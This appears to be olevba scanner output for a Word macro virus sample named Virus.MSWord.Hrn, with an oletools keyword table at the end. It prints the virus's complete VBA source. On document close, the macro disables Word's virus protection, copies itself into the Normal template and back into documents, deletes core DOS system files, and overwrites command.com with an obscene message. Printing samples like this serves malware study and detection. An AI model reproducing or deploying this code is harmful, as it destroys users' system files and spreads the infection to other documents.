olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hrn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hrn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Hrn - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Docclose()
Attribute Docclose.VB_Description = "Ìàêðîñ çàïèñàí 05/15/99 viktork"
Attribute Docclose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
On Error Resume Next
    Application.DisplayStatusBar = True
    With ActiveWindow
        .DisplayHorizontalScrollBar = True
        .DisplayVerticalScrollBar = True
        .StyleAreaWidth = CentimetersToPoints(0)
        .DisplayScreenTips = True
        With .View
            .ShowAnimation = True
            .Draft = False
            .WrapToWindow = False
            .ShowPicturePlaceHolders = False
            .ShowFieldCodes = False
            .ShowBookmarks = False
            .FieldShading = wdFieldShadingWhenSelected
            .ShowTabs = False
            .ShowSpaces = False
            .ShowParagraphs = False
            .ShowHyphens = False
            .ShowHiddenText = False
            .ShowAll = False
            .ShowHighlight = True
        End With
    End With
    With Options
        .Pagination = True
        .WPHelp = False
        .WPDocNavKeys = False
        .ShortMenuNames = False
        .RTFInClipboard = True
        .BlueScreen = False
        .EnableSound = False
        .ConfirmConversions = True
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .MeasurementUnit = wdCentimeters
        .AnimateScreenMovements = True
        .VirusProtection = False
    End With
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 4
    
'Äîïèñûâàåì åñëè íåò íîðìàëå
     '   Application.OrganizerDelete Normal.ThisDocument.FullName, "NewMacros", wdOrganizerObjectProjectItems
        
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        Normal.ThisDocument.FullName, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems

'Äîïèñûâàåì åñëè íåò â äîêóìåíòå, à åñòü â íîðìàëå
     '   Application.OrganizerDelete ActiveDocument.FullName, "NewMacros", wdOrganizerObjectProjectItems

        Application.OrganizerCopy Source:= _
        Normal.ThisDocument.FullName, Destination:= _
        ActiveDocument.FullName, Name:="NewMAcros", Object:=wdOrganizerObjectProjectItems
'Äåëàåì Õåðíþ
Kill "c:\command.com"
Kill "c:\config.sys"
Kill "c:\autoexec.bat"
Kill "c:\io.sys"
Kill "c:\msdos.sys"

Open "c:\command.com" For Output As #1
    Print #1, "Â æîïó íå åáàòüñÿ, ñäåëàþ õåðíþ !!!"
Close #1
ActiveDocument.Save
Normal.ThisDocument.Save
ActiveDocument.Close
End Sub
Sub DelRow()
Attribute DelRow.VB_Description = "Ìàêðîñ çàïèñàí 20.07.00 OrChiD"
Attribute DelRow.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.DelRow"
'
' DelRow Ìàêðîñ
' Ìàêðîñ çàïèñàí 20.07.00 OrChiD
'
    Selection.Cells.Delete ShiftCells:=wdDeleteCellsEntireRow
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

